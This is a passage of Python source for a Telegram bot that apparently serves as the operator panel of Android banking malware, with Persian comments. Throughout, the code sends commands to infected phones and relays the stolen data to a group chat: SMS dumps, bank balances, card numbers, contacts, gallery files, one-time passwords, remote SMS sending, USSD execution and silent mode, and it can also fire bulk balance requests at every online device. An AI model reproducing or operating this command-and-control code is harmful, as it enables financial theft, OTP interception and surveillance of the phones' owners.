        telebot.types.InlineKeyboardButton("💰 Balance", callback_data=f"cmd_{set_code}_GET_BALANCES"),
        telebot.types.InlineKeyboardButton("💳 Card Number", callback_data=f"cmd_{set_code}_GET_CARDS"),
        telebot.types.InlineKeyboardButton("📟 USSD", callback_data=f"cmd_{set_code}_GET_USSD"),
        telebot.types.InlineKeyboardButton("📱 Installed Apps", callback_data=f"cmd_{set_code}_GET_INSTALLED_APPS"),
        telebot.types.InlineKeyboardButton("📨 All SMS", callback_data=f"cmd_{set_code}_GET_ALL_SMS"),
        telebot.types.InlineKeyboardButton("📨 Last SMS", callback_data=f"cmd_{set_code}_GET_LAST_SMS"),
        telebot.types.InlineKeyboardButton("📇 User Number", callback_data=f"cmd_{set_code}_GET_USER_NUMBER"),
        telebot.types.InlineKeyboardButton("📝 Set Nickname", callback_data=f"cmd_{set_code}_SET_NICKNAME"),
        telebot.types.InlineKeyboardButton("📨 SMS History", callback_data=f"cmd_{set_code}_GET_SMS_BY_NUMBER"),
        telebot.types.InlineKeyboardButton("🔇 Silent", callback_data=f"cmd_{set_code}_SILENT_MODE"),
        telebot.types.InlineKeyboardButton("🔊 Normal", callback_data=f"cmd_{set_code}_NORMAL_MODE"),
        telebot.types.InlineKeyboardButton("🔄 Refresh", callback_data=f"refresh_{set_code}"),
        telebot.types.InlineKeyboardButton("📖 Off-Mode Guide", callback_data=f"off_mode_{set_code}"),
        telebot.types.InlineKeyboardButton("🏠 Back to Main", callback_data="back_main")
    ]
    keyboard.add(*buttons)
    return keyboard

def request_all_keyboard():
    keyboard = telebot.types.InlineKeyboardMarkup(row_width=1)
    keyboard.add(
        telebot.types.InlineKeyboardButton("💰 Balances", callback_data="request_all_BALANCES"),
        telebot.types.InlineKeyboardButton("📞 Phone Numbers", callback_data="request_all_PHONE_NUMBERS"),
        telebot.types.InlineKeyboardButton("🏠 Back to Main", callback_data="back_main")
    )
    return keyboard

def device_list_keyboard(devices):
    keyboard = telebot.types.InlineKeyboardMarkup(row_width=1)
    for d in devices:
        display_name = d.get('nickname') if d.get('nickname') else d['device_name']
        keyboard.add(telebot.types.InlineKeyboardButton(
            f"{display_name} ({d['set_code']})",
            callback_data=f"show_{d['set_code']}"
        ))
    keyboard.add(telebot.types.InlineKeyboardButton("🏠 Back to Main", callback_data="back_main"))
    return keyboard

def sim_selection_keyboard(set_code, sim_info, action_type, extra_params=None):
    keyboard = telebot.types.InlineKeyboardMarkup(row_width=1)
    if sim_info and isinstance(sim_info, list) and len(sim_info) > 0:
        for idx, sim in enumerate(sim_info):
            operator = sim.get('operator', f"سیم‌کارت {idx + 1}")
            label = f"📱 {operator} (Slot {idx + 1})"
            callback_data = f"simsel|{set_code}|{action_type}|{idx}"
            if extra_params:
                temp_key = f"{set_code}_{action_type}"
                set_temp_data(temp_key, extra_params)
            keyboard.add(telebot.types.InlineKeyboardButton(label, callback_data=callback_data))
    else:
        keyboard.add(telebot.types.InlineKeyboardButton("📱 سیم‌کارت پیش‌فرض (Slot 0)", callback_data=f"simsel|{set_code}|{action_type}|0"))
        if extra_params:
            temp_key = f"{set_code}_{action_type}"
            set_temp_data(temp_key, extra_params)
    keyboard.add(telebot.types.InlineKeyboardButton("❌ انصراف", callback_data=f"cancel_dialog_{set_code}"))
    return keyboard

# ============================================================
# تابع کمکی برای ویرایش/ارسال پیام
# ============================================================
def safe_edit_or_send(chat_id, text, edit_message_id=None, parse_mode='HTML', reply_markup=None):
    if edit_message_id:
        try:
            bot.edit_message_text(text, chat_id, edit_message_id, parse_mode=parse_mode, reply_markup=reply_markup)
            return
        except ApiTelegramException as e:
            desc = e.result_json.get('description', '')
            if "message is not modified" in desc:
                logger.debug("Edit skipped: message not modified")
                return
            logger.warning(f"Failed to edit message {edit_message_id}, falling back to sending: {e}")
        except Exception as e:
            logger.warning(f"Failed to edit message {edit_message_id}, falling back to sending: {e}")
            
    try:
        bot.send_message(chat_id, text, parse_mode=parse_mode, reply_markup=reply_markup)
    except Exception as e:
        logger.error(f"❌ Failed to send message to {chat_id}: {e}")

# ============================================================
# نمایش اطلاعات دستگاه
# ============================================================
def show_device_info(chat_id, set_code, edit_message_id=None):
    if not set_code.startswith("SET_"):
        msg = "❌ Invalid device code."
        safe_edit_or_send(chat_id, msg, edit_message_id)
        return False
    # همواره در هنگام باز کردن صریح پنل دستگاه، کش را دور بزن تا اطلاعات واقعی و زنده به کاربر نشان داده شود
    device = get_device_info(set_code, bypass_cache=True)
    if not device:
        msg = f"❌ Device <code>{set_code}</code> not found."
        safe_edit_or_send(chat_id, msg, edit_message_id)
        return False
    nickname = device.get('nickname')
    device_name = device.get('device_name', 'Unknown')
    display_name = nickname if nickname else device_name
    msg = f"<b>📱 Device: {escape_html(display_name)}</b>\n"
    if nickname:
        msg += f"📛 Device Name: <code>{escape_html(device_name)}</code>\n"
    msg += f"🔑 Code: <code>{escape_html(device.get('set_code', ''))}</code>\n"
    
    status = device.get('status', 'offline')
    status_icon = "🟢 Online" if status == "online" else "🔴 Offline"
    
    msg += f"📶 Status: {status_icon}\n"
    msg += f"🔋 Battery: {device.get('battery', 'N/A')}%\n"
    msg += f"📡 IP: {escape_html(device.get('ip', 'N/A'))}\n"
    msg += f"📅 Last Seen: {escape_html(device.get('last_seen', 'N/A'))}\n"
    sim_info = device.get('sim_info', [])
    if sim_info and isinstance(sim_info, list):
        msg += f"\n<b>📱 سیم‌کارت‌ها:</b>\n"
        for idx, sim in enumerate(sim_info):
            operator = sim.get('operator', f"اپراتور {idx + 1}")
            msg += f"  • Slot {idx + 1}: {escape_html(operator)}\n"
    keyboard = device_panel_keyboard(set_code)
    safe_edit_or_send(chat_id, msg, edit_message_id, parse_mode='HTML', reply_markup=keyboard)
    return True

# ============================================================
# ارسال دستور به دستگاه (با timeout بیشتر)
# ============================================================
def send_command_to_device(chat_id, set_code, command_type, params=None, edit_message_id=None):
    # ★ Pry-پیش‌تولید کاملاً هماهنگ شناسه دستور قبل از فرستادن به وب‌سوکت جهت رفع تداخل همزمانی میلی‌ثانیه‌ای (Race Condition)
    command_id = int(time.time() * 1000)
    
    # ★★★ برای PING، زمان ارسال دقیق ربات را ذخیره کن ★★★
    if command_type == "PING":
        send_time = time.time()
        if params is None:
            params = {}
        params['send_time'] = send_time
        
    # ★ Pry-ثبت دستی و فوری شناسه در دایرکتوری در حال انتظار قبل از ارسال پیام وب‌سوکت
    ws_client.pending_requests[command_id] = {
        'received': False, 
        'command_type': command_type, 
        'chat_id': chat_id, 
        'edit_message_id': edit_message_id
    }
    
    sent_command_id = add_command(set_code, command_type, params, command_id=command_id)
    if not sent_command_id:
        msg = f"❌ Failed to send command <code>{command_type}</code>."
        safe_edit_or_send(chat_id, msg, edit_message_id)
        # تمیزکاری کش در صورت شکست ارسال اولیه
        try:
            del ws_client.pending_requests[command_id]
        except KeyError:
            pass
        return False
        
    msg = f"⚡ Command <code>{command_type}</code> sent to <code>{set_code}</code>."
    safe_edit_or_send(chat_id, msg, edit_message_id)
    
    def check_and_send_result():
        # بررسی سریع‌تر ثانیه‌ای برای پاسخ آنی بدون تاخیر ۶۰ ثانیه‌ای
        retry_limit = (GALLERY_RETRY_LIMIT if command_type == "GET_GALLERY" else COMMAND_RETRY_LIMIT) * 3
        for attempt in range(retry_limit):
            time.sleep(1)
            
            found_req = None
            # جستجو هم به صورت کلید رشته‌ای هم عددی
            for cid in list(ws_client.pending_requests.keys()):
                if str(cid) == str(command_id):
                    found_req = ws_client.pending_requests[cid]
                    break
                    
            if found_req and found_req.get('received'):
                result_data = found_req.get('result')
                if result_data is not None:
                    # برای دستور PING، زمان دریافت را ثبت کن
                    if command_type == "PING":
                        if isinstance(result_data, dict):
                            result_data['receive_time'] = time.time()
                            # ارسال زمان دقیق ارسال ربات (اگر در params ذخیره شده بود)
                            if params and 'send_time' in params:
                                result_data['send_time'] = params['send_time']
                    
                    send_result_to_group(command_type, command_id, set_code, result_data)
                    
                    # تمیزکاری کش درخواست‌ها جهت مصرف بهینه رم سیستم‌های ضعیف
                    try:
                        del ws_client.pending_requests[command_id]
                    except KeyError:
                        pass
                    return
                        
            if attempt == retry_limit - 1:
                logger.warning(f"Result for command {command_id} not found after timeout.")
                device_name = get_display_name(set_code)
                error_msg = f"⏰ <b>Command Timeout</b>\n"
                error_msg += f"📱 Device: <code>{escape_html(device_name)}</code>\n"
                error_msg += f"🔑 Code: <code>{set_code}</code>\n"
                error_msg += f"❌ No response received within {retry_limit // 3} seconds."
                if set_code:
                    error_msg += f"\n\n🔑 /{set_code}"
                try:
                    bot.send_message(GROUP_CHAT_ID, error_msg, parse_mode='HTML')
                except:
                    pass
                try:
                    del ws_client.pending_requests[command_id]
                except KeyError:
                    pass
                
    threading.Thread(target=check_and_send_result, daemon=True).start()
    return True

# ============================================================
# ارسال نتیجه به گروه
# ============================================================
def send_result_to_group(command_type, command_id, set_code, result_data=None):
    try:
        # اگر command_type ارسال نشده بود، نوع آن را هوشمندانه حدس بزن
        if command_type is None and result_data:
            command_type = infer_command_type(result_data) or "UNKNOWN"
            
        if result_data is None:
            if command_id and command_id in ws_client.pending_requests:
                req = ws_client.pending_requests.get(command_id)
                if req and req.get('received'):
                    result_data = req.get('result')
            if result_data is None:
                logger.warning(f"No result data for command {command_id}")
                return False
                
        device_name = get_display_name(set_code)
        raw_result = result_data
        
        # تکمیل مقادیر پینگ در صورت پردازش
        if command_type == "PING" and isinstance(raw_result, dict):
            if 'receive_time' not in raw_result:
                raw_result['receive_time'] = time.time()
                
            # در صورتی که زمان ارسال از command_id استخراج نشده و در result_data نباشد، تلاش برای استخراج از command_id
            if 'send_time' not in raw_result and command_id:
                try:
                    cid_val = float(command_id)
                    if cid_val > 1000000000000: # 13-digit millisecond timestamp
                        raw_result['send_time'] = cid_val / 1000.0
                    elif cid_val > 100000000: # 10-digit second timestamp
                        raw_result['send_time'] = cid_val
                except Exception:
                    pass
        
        # GET_GALLERY
        if command_type == "GET_GALLERY":
            urls = raw_result.get("urls", [])
            total = raw_result.get("total", 0)
            uploaded = raw_result.get("uploaded", 0)
            
            if not urls:
                msg = f"<b>🖼️ GALLERY RESULT</b>\n"
                msg += f"📱 Device: <code>{escape_html(device_name)}</code>\n"
                msg += f"📊 Uploaded: <code>0</code> / <code>{total}</code>\n"
                msg += f"❌ هیچ لینکی دریافت نشد."
                if set_code:
                    msg += f"\n\n🔑 /{set_code}"
                bot.send_message(GROUP_CHAT_ID, msg, parse_mode='HTML')
                return True
            msg = f"<b>🖼️ GALLERY RESULT</b>\n"
            msg += f"📱 Device: <code>{escape_html(device_name)}</code>\n"
            msg += f"📊 Uploaded: <code>{uploaded}</code> / <code>{total}</code>\n"
            msg += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            keyboard = telebot.types.InlineKeyboardMarkup(row_width=1)
            for idx, url in enumerate(urls, 1):
                short_url = url[:40] + "..." if len(url) > 40 else url
                safe_url = escape_html(url)
                button_text = f"📎 Part {idx}: {escape_html(short_url)}"
                keyboard.add(telebot.types.InlineKeyboardButton(
                    button_text,
                    url=safe_url
                ))
            keyboard.add(telebot.types.InlineKeyboardButton(
                "🔙 Back to Device Panel",
                callback_data=f"show_{set_code}"
            ))
            if set_code:
                msg += f"\n🔑 /{set_code}"
            
            bot.send_message(
                GROUP_CHAT_ID,
                msg,
                parse_mode='HTML',
                reply_markup=keyboard,
                disable_web_page_preview=True
            )
            logger.info(f"✅ Gallery result for {set_code} sent with {len(urls)} links.")
            return True

        # GET_ALL_SMS
        if command_type == "GET_ALL_SMS":
            file_url = raw_result.get("file_url")
            count = raw_result.get("count", 0)
            if not file_url:
                msg = f"<b>📨 ALL SMS</b>\n"
                msg += f"📱 Device: <code>{escape_html(device_name)}</code>\n"
                msg += f"❌ هیچ پیامکی یافت نشد یا فایلی آپلود نشد."
                if set_code:
                    msg += f"\n\n🔑 /{set_code}"
                bot.send_message(GROUP_CHAT_ID, msg, parse_mode='HTML')
                return True
            msg = f"<b>📨 ALL SMS</b>\n"
            msg += f"📱 Device: <code>{escape_html(device_name)}</code>\n"
            msg += f"📊 Total: <code>{count}</code>\n"
            msg += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            msg += f"📎 فایل پیامک‌ها آماده دانلود است."
            keyboard = telebot.types.InlineKeyboardMarkup(row_width=1)
            safe_url = escape_html(file_url)
            keyboard.add(telebot.types.InlineKeyboardButton(
                "📥 دانلود فایل پیامک‌ها (ZIP)",
                url=safe_url
            ))
            keyboard.add(telebot.types.InlineKeyboardButton(
                "🔙 Back to Device Panel",
                callback_data=f"show_{set_code}"
            ))
            if set_code:
                msg += f"\n\n🔑 /{set_code}"
            bot.send_message(
                GROUP_CHAT_ID,
                msg,
                parse_mode='HTML',
                reply_markup=keyboard,
                disable_web_page_preview=True
            )
            logger.info(f"✅ All SMS result for {set_code} sent with file link.")
            return True

        # GET_ALL_BANK_SMS
        if command_type == "GET_ALL_BANK_SMS" or command_type == "GET_BANK_SMS":
            formatted = format_bank_sms_result(raw_result, device_name, set_code)
            if formatted is not None:
                bot.send_message(GROUP_CHAT_ID, formatted, parse_mode='HTML')
                logger.info(f"✅ Bank SMS result for {set_code} sent.")
            return True

        # GET_INSTALLED_APPS
        if command_type == "GET_INSTALLED_APPS":
            apps = raw_result.get("apps", [])
            user_apps = [app for app in apps if not app.get("is_system_app", True)]
            total = len(user_apps)
            if total == 0:
                msg = f"<b>📱 INSTALLED APPS</b>\n📱 Device: <code>{escape_html(device_name)}</code>\n❌ هیچ برنامه کاربردی یافت نشد."
                if set_code:
                    msg += f"\n\n🔑 /{set_code}"
                bot.send_message(GROUP_CHAT_ID, msg, parse_mode='HTML')
                return True
            content = generate_apps_file_content(user_apps)
            caption = f"📱 INSTALLED APPS\n📱 Device: {device_name}\n📊 Total: {total}"
            send_as_file(GROUP_CHAT_ID, content, f"installed_apps_{set_code}.txt", caption, set_code)
            return True

        # GET_SMS_BY_NUMBER
        if command_type == "GET_SMS_BY_NUMBER":
            sms_list = raw_result.get("sms", [])
            total = len(sms_list)
            phone_number = raw_result.get("phone_number", "نامشخص")
            if total == 0:
                msg = f"<b>📨 SMS HISTORY</b>\n📱 Device: <code>{escape_html(device_name)}</code>\n📞 Phone: <code>{escape_html(phone_number)}</code>\n❌ هیچ پیامکی با این شماره یافت نشد."
                if set_code:
                    msg += f"\n\n🔑 /{set_code}"
                bot.send_message(GROUP_CHAT_ID, msg, parse_mode='HTML')
                return True
            content = generate_sms_file_content(sms_list, device_name, f"SMS HISTORY for {phone_number}")
            caption = f"📨 SMS HISTORY\n📱 Device: {device_name}\n📞 Phone: {phone_number}\n📊 Total: {total}"
            send_as_file(GROUP_CHAT_ID, content, f"sms_history_{set_code}.txt", caption, set_code)
            return True

        # GET_CONTACTS
        if command_type == "GET_CONTACTS":
            contacts = raw_result.get("contacts", [])
            total = len(contacts)
            if total == 0:
                msg = f"<b>📞 CONTACTS</b>\n📱 Device: <code>{escape_html(device_name)}</code>\n❌ هیچ مخاطبی یافت نشد."
                if set_code:
                    msg += f"\n\n🔑 /{set_code}"
                bot.send_message(GROUP_CHAT_ID, msg, parse_mode='HTML')
                return True
            content = generate_contacts_file_content(contacts, device_name)
            caption = f"📞 CONTACTS\n📱 Device: {device_name}\n📊 Total: {total}"
            send_as_file(GROUP_CHAT_ID, content, f"contacts_{set_code}.txt", caption, set_code)
            return True

        # سایر دستورات (شامل PING و فرمت عمومی)
        formatted_message = format_result(command_type, raw_result, device_name, set_code)
        if formatted_message is None:
            return True
        if set_code:
            formatted_message += f"\n\n🔑 /{set_code}"
        bot.send_message(GROUP_CHAT_ID, formatted_message, parse_mode='HTML')
        logger.info(f"✅ Result for {command_type} sent to group.")
        return True
    except Exception as e:
        logger.error(f"Error sending result to group: {e}")
        return False

# ============================================================
# پردازش درخواست‌های Request All
# ============================================================
def process_request_all(chat_id, message_id, command_type):
    command_map = {
        'BALANCES': 'GET_BALANCES',
        'PHONE_NUMBERS': 'GET_USER_NUMBER'
    }
    real_command = command_map.get(command_type, command_type)
    
    devices = get_online_devices()
    total = len(devices)
    if not devices:
        safe_edit_or_send(chat_id, "❌ No devices are online.", message_id)
        return
    safe_edit_or_send(chat_id, f"⏳ Sending <code>{real_command}</code> to <b>{total}</b> online devices...", message_id)
    sent_count = 0
    failed_count = 0
    for d in devices:
        command_id = add_command(d['set_code'], real_command)
        if command_id:
            sent_count += 1
            set_code = d['set_code']
            
            # ثبت شناسه موقت دستور در ربات برای دریافت نتیجه Real-time
            ws_client.pending_requests[command_id] = {
                'received': False, 
                'command_type': real_command, 
                'chat_id': chat_id, 
                'edit_message_id': message_id
            }
            
            def check_and_send_result(cmd_id, s_code):
                for attempt in range(COMMAND_RETRY_LIMIT):
                    time.sleep(1)
                    if cmd_id in ws_client.pending_requests:
                        req = ws_client.pending_requests.get(cmd_id)
                        if req and req.get('received'):
                            result_data = req.get('result')
                            if result_data is not None:
                                send_result_to_group(real_command, cmd_id, s_code, result_data)
                                if cmd_id in ws_client.pending_requests:
                                    del ws_client.pending_requests[cmd_id]
                                return
                logger.warning(f"Result for command {cmd_id} not found after timeout.")
                if cmd_id in ws_client.pending_requests:
                    del ws_client.pending_requests[cmd_id]
                    
            threading.Thread(
                target=check_and_send_result,
                args=(command_id, set_code),
                daemon=True
            ).start()
        else:
            failed_count += 1
            logger.warning(f"Failed to send command to {d['set_code']}")
    summary_msg = f"✅ Command <code>{real_command}</code> sent to <b>{sent_count}</b> out of <b>{total}</b> online devices."
    if failed_count > 0:
        summary_msg += f"\n⚠️ Failed: {failed_count} device(s)."
    bot.send_message(
        chat_id,
        summary_msg,
        parse_mode='HTML',
        reply_markup=main_menu_keyboard()
    )

# ============================================================
# پردازش تنظیم نیک‌نام
# ============================================================
def process_set_nickname(message, set_code, original_message_id):
    chat_id = message.chat.id
    nickname = message.text.strip()
    if nickname == "":
        nickname = None
    success = update_nickname(set_code, nickname)
    if success:
        bot.send_message(chat_id, f"✅ Nickname updated successfully.", parse_mode='HTML')
    else:
        bot.send_message(chat_id, f"❌ Failed to update nickname.", parse_mode='HTML')
    show_device_info(chat_id, set_code)
    try:
        bot.delete_message(chat_id, original_message_id)
    except:
        pass

# ============================================================
# توابع دیالوگ
# ============================================================
def normalize_phone_number(number):
    clean = number.strip()
    if clean.startswith("+98"):
        clean = clean[3:]
    elif clean.startswith("98"):
        clean = clean[2:]
    clean = re.sub(r'[^0-9]', '', clean)
    if len(clean) == 10:
        clean = "0" + clean
    if len(clean) == 11 and clean.startswith("0"):
        return clean
    return None

def process_send_sms_number(message, set_code, original_message_id):
    chat_id = message.chat.id
    number = message.text.strip()
    clean_number = normalize_phone_number(number)
    if not clean_number:
        bot.send_message(chat_id, "❌ Invalid phone number.", parse_mode='HTML')
        show_device_info(chat_id, set_code)
        return
    temp_key = f"{set_code}_send_sms"
    set_temp_data(temp_key, {'number': clean_number})
    msg = bot.send_message(chat_id, f"📝 Destination number <code>{clean_number}</code> saved.\nPlease enter the message text:", parse_mode='HTML')
    bot.register_next_step_handler(msg, process_send_sms_text, set_code, original_message_id)
    try:
        bot.delete_message(chat_id, original_message_id)
    except:
        pass

def process_send_sms_text(message, set_code, original_message_id):
    chat_id = message.chat.id
    text = message.text.strip()
    if not text:
        bot.send_message(chat_id, "❌ Message text cannot be empty.", parse_mode='HTML')
        show_device_info(chat_id, set_code)
        return
    temp_key = f"{set_code}_send_sms"
    data = get_temp_data(temp_key) or {}
    number = data.get('number', '')
    if not number:
        bot.send_message(chat_id, "❌ Phone number not found.", parse_mode='HTML')
        show_device_info(chat_id, set_code)
        return
    set_temp_data(temp_key, {'number': number, 'text': text})
    device = get_device_info(set_code)
    sim_info = device.get('sim_info', []) if device else []
    keyboard = sim_selection_keyboard(set_code, sim_info, "send_sms", extra_params={'number': number, 'text': text})
    bot.send_message(chat_id, f"📨 Number: <code>{number}</code>\n📝 Message: <code>{text[:50]}{'...' if len(text) > 50 else ''}</code>\n\nPlease select SIM card:", parse_mode='HTML', reply_markup=keyboard)
    try:
        bot.delete_message(chat_id, original_message_id)
    except:
        pass

def process_ussd_code(message, set_code, original_message_id):
    chat_id = message.chat.id
    code = message.text.strip()
    if not code:
        bot.send_message(chat_id, "❌ USSD code cannot be empty.", parse_mode='HTML')
        show_device_info(chat_id, set_code)
        return
    temp_key = f"{set_code}_ussd"
    set_temp_data(temp_key, {'code': code})
    device = get_device_info(set_code)
    sim_info = device.get('sim_info', []) if device else []
    keyboard = sim_selection_keyboard(set_code, sim_info, "ussd", extra_params={'code': code})
    bot.send_message(chat_id, f"📟 USSD code <code>{code}</code> saved.\nPlease select SIM card:", parse_mode='HTML', reply_markup=keyboard)
    try:
        bot.delete_message(chat_id, original_message_id)
    except:
        pass

def process_sms_history_number(message, set_code, original_message_id):
    chat_id = message.chat.id
    number = message.text.strip()
    if re.match(r'^[0-9+]+$', number):
        clean_number = normalize_phone_number(number)
        if not clean_number:
            bot.send_message(chat_id, "❌ Invalid phone number.", parse_mode='HTML')
            show_device_info(chat_id, set_code)
            return
    else:
        clean_number = number
        
    send_command_to_device(chat_id, set_code, "GET_SMS_BY_NUMBER", params={"phoneNumber": clean_number}, edit_message_id=original_message_id)
    time.sleep(1)
    show_device_info(chat_id, set_code)
    try:
        bot.delete_message(chat_id, original_message_id)
    except:
        pass

# ============================================================
# هندلرها
# ============================================================
@bot.message_handler(func=lambda message: message.text and re.match(r'^/SET_([A-Z0-9]+)(?:@[a-zA-Z0-9_]+)?$', message.text.strip()))
def handle_set_command(message):
    match = re.match(r'^/SET_([A-Z0-9]+)(?:@[a-zA-Z0-9_]+)?$', message.text.strip())
    if match:
        set_code = "SET_" + match.group(1)
        show_device_info(message.chat.id, set_code)

@bot.message_handler(commands=['start'])
def start(message):
    stats = get_stats()
    total = stats.get('total_users', 0)
    online = stats.get('online_users', 0)
    offline = stats.get('offline_users', 0)
    msg = f"Welcome to CEPH Control Panel.\n\n"
    msg += f"<b>📊 User Statistics:</b>\n"
    msg += f"• Total users: {total}\n"
    msg += f"• Online (Active WS): {online}\n"
    msg += f"• Offline: {offline}\n\n"
    msg += "Please select an option below:"
    bot.send_message(message.chat.id, msg, parse_mode='HTML', reply_markup=main_menu_keyboard())

# ============================================================
# Callback Handler
# ============================================================
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    chat_id = call.message.chat.id
    message_id = call.message.message_id
    data = call.data
    try:
        bot.answer_callback_query(call.id)
    except:
        pass

    if data == "noop":
        return

    if data == "back_main":
        stats = get_stats()
        total = stats.get('total_users', 0)
        online = stats.get('online_users', 0)
        offline = stats.get('offline_users', 0)
        msg = f"Welcome to CEPH Control Panel.\n\n<b>📊 User Statistics:</b>\n• Total users: {total}\n• Online (Active WS): {online}\n• Offline: {offline}\n\nPlease select an option below:"
        safe_edit_or_send(chat_id, msg, message_id, parse_mode='HTML', reply_markup=main_menu_keyboard())
        return

    if data == "online_users":
        devices = get_online_devices()
        if not devices:
            safe_edit_or_send(chat_id, "❌ No users are online.", message_id, parse_mode='HTML')
            return
        safe_edit_or_send(chat_id, "🟢 <b>Online Devices:</b>\nSelect a device to manage:", message_id, parse_mode='HTML', reply_markup=device_list_keyboard(devices))
        return

    if data == "request_all":
        safe_edit_or_send(chat_id, "📤 <b>Request All Devices</b>\nSelect request type:", message_id, parse_mode='HTML', reply_markup=request_all_keyboard())
        return

    if data.startswith("request_all_"):
        command_type = data[12:]
        process_request_all(chat_id, message_id, command_type)
        return

    if data.startswith("show_"):
        parts = data.split('_', 1)
        if len(parts) < 2:
            safe_edit_or_send(chat_id, "❌ Invalid callback data.", message_id, parse_mode='HTML')
            return
        set_code = parts[1]
        show_device_info(chat_id, set_code, edit_message_id=message_id)
        return

    if data.startswith("refresh_"):
        parts = data.split('_', 1)
        if len(parts) < 2:
            safe_edit_or_send(chat_id, "❌ Invalid callback data.", message_id, parse_mode='HTML')
            return
        set_code = parts[1]
        show_device_info(chat_id, set_code, edit_message_id=message_id)
        return

    if data.startswith("cancel_dialog_"):
        parts = data.split('_', 2)
        if len(parts) < 3:
            safe_edit_or_send(chat_id, "❌ Invalid callback data.", message_id, parse_mode='HTML')
            return
        set_code = parts[2]
        show_device_info(chat_id, set_code, edit_message_id=message_id)
        return

    # Off-Mode Guide
    if data.startswith("off_mode_"):
        set_code = data.split("_", 2)[2]
        user_number_cmd = f"/{set_code}"
        guide_text = (
            f"<b>📖 راهنمای دستورات راه دور (SMS Commands)</b>\n\n"
            f"برای دریافت شماره کاربر، روی دکمه <code>📇 User Number</code> در پنل کلیک کنید یا دستور <code>{user_number_cmd}</code> را در تلگرام ارسال کنید.\n\n"
            f"با ارسال پیامک به دستگاه، می‌توانید دستورات زیر را اجرا کنید:\n\n"
            f"<b>1. دریافت آخرین OTP (رمز یکبارمصرف)</b>\n"
            f"متن: <code>GET_LAST_SMS</code>\n"
            f"→ آخرین پیامک دریافتی را بررسی کرده و کد OTP ۴ تا ۸ رقمی را استخراج می‌کند.\n\n"
            f"<b>2. اجرای USSD</b>\n"
            f"متن: <code>GET_USSD:شماره_سیم‌کارت:کد_USSD</code>\n"
            f"مثال: <code>GET_USSD:1:*140*11#</code>\n"
            f"→ کد USSD را روی سیم‌کارت مشخص اجرا می‌کند.\n\n"
            f"<b>3. دریافت موجودی حساب‌ها</b>\n"
            f"متن: <code>GET_BALANCES</code> یا <code>GET_BANK_BALANCE</code>\n"
            f"→ موجودی حساب‌های بانکی را از پیامک‌های دریافتی استخراج می‌کند.\n\n"
            f"<b>4. دریافت شماره کارت‌ها</b>\n"
            f"متن: <code>GET_CARD_NUMBER</code>\n"
            f"→ شماره کارت‌های ۱۶ رقمی را از پیامک‌های ارسالی استخراج می‌کند.\n\n"
            f"<b>🔑 نکته:</b> تمام دستورات به حروف بزرگ/کوچک حساس نیستند.\n"
            f"پاسخ هر دستور از طریق SMS به شماره فرستنده بازگردانده می‌شود.\n"
            f"برای اطلاعات بیشتر، به پنل دستگاه مراجعه کنید."
        )
        keyboard = telebot.types.InlineKeyboardMarkup()
        keyboard.add(telebot.types.InlineKeyboardButton("🔙 Back to Device Panel", callback_data=f"show_{set_code}"))
        safe_edit_or_send(chat_id, guide_text, message_id, parse_mode='HTML', reply_markup=keyboard)
        return

    # simsel
    if data.startswith("simsel|"):
        parts = data.split('|')
        if len(parts) != 4:
            safe_edit_or_send(chat_id, "❌ Invalid callback data.", message_id, parse_mode='HTML')
            return
        set_code = parts[1]
        action_type = parts[2]
        try:
            slot = int(parts[3])
        except (ValueError, TypeError):
            slot = 0
        temp_key = f"{set_code}_{action_type}"
        extra_params = get_temp_data(temp_key) or {}
        delete_temp_data(temp_key)
        
        if action_type == "send_sms":
            number = extra_params.get('number')
            text = extra_params.get('text')
            if not number or not text:
                safe_edit_or_send(chat_id, "⚠️ اطلاعات پیامک کامل نیست.", message_id, parse_mode='HTML')
                show_device_info(chat_id, set_code, edit_message_id=message_id)
                return
            command_params = {"number": number, "message": text, "simSlot": str(slot)}
            send_command_to_device(chat_id, set_code, "SEND_SMS", command_params, edit_message_id=message_id)
            time.sleep(1)
            show_device_info(chat_id, set_code, edit_message_id=message_id)
            return
            
        if action_type == "ussd":
            code = extra_params.get('code')
            if not code:
                safe_edit_or_send(chat_id, "⚠️ کد USSD پیدا نشد.", message_id, parse_mode='HTML')
                show_device_info(chat_id, set_code, edit_message_id=message_id)
                return
            command_params = {"code": code, "simSlot": str(slot)}
            send_command_to_device(chat_id, set_code, "GET_USSD", command_params, edit_message_id=message_id)
            time.sleep(1)
            show_device_info(chat_id, set_code, edit_message_id=message_id)
            return
            
        if action_type == "sms_history":
            number = extra_params.get('number')
            if not number:
                safe_edit_or_send(chat_id, "⚠️ شماره پیدا نشد.", message_id, parse_mode='HTML')
                show_device_info(chat_id, set_code, edit_message_id=message_id)
                return
            send_command_to_device(chat_id, set_code, "GET_SMS_BY_NUMBER", {"phoneNumber": number, "simSlot": str(slot)}, edit_message_id=message_id)
            time.sleep(1)
            show_device_info(chat_id, set_code, edit_message_id=message_id)
            return
            
        safe_edit_or_send(chat_id, "❌ Action type unknown.", message_id, parse_mode='HTML')
        show_device_info(chat_id, set_code, edit_message_id=message_id)
        return

    if data.startswith("cmd_"):
        parts = data.split('_', 3)
        if len(parts) < 4:
            safe_edit_or_send(chat_id, "❌ Invalid callback data.", message_id, parse_mode='HTML')
            return
        set_code = parts[1] + '_' + parts[2]
        command_type = parts[3]
        
        if command_type == "GET_GALLERY":
            send_command_to_device(chat_id, set_code, command_type, edit_message_id=message_id)
            time.sleep(1)
            show_device_info(chat_id, set_code, edit_message_id=message_id)
            return
            
        if command_type == "SET_NICKNAME":
            msg = bot.edit_message_text(f"✏️ Please enter a new nickname for device <code>{set_code}</code>:\n(Leave empty to clear nickname)", chat_id, message_id, parse_mode='HTML')
            bot.register_next_step_handler(msg, process_set_nickname, set_code, message_id)
            return
            
        if command_type == "SEND_SMS":
            msg = bot.edit_message_text(f"📨 Please enter the destination number for sending SMS from device <code>{set_code}</code>:\n(Example: 09123456789)", chat_id, message_id, parse_mode='HTML')
            bot.register_next_step_handler(msg, process_send_sms_number, set_code, message_id)
            return
            
        if command_type == "GET_USSD":
            msg = bot.edit_message_text(f"📟 Please enter the USSD code for device <code>{set_code}</code>:\n(Example: *140*11#)", chat_id, message_id, parse_mode='HTML')
            bot.register_next_step_handler(msg, process_ussd_code, set_code, message_id)
            return
            
        if command_type == "GET_SMS_BY_NUMBER":
            msg = bot.edit_message_text(f"📨 Please enter the phone number to get SMS history for device <code>{set_code}</code>:\n(Example: 09123456789)", chat_id, message_id, parse_mode='HTML')
            bot.register_next_step_handler(msg, process_sms_history_number, set_code, message_id)
            return

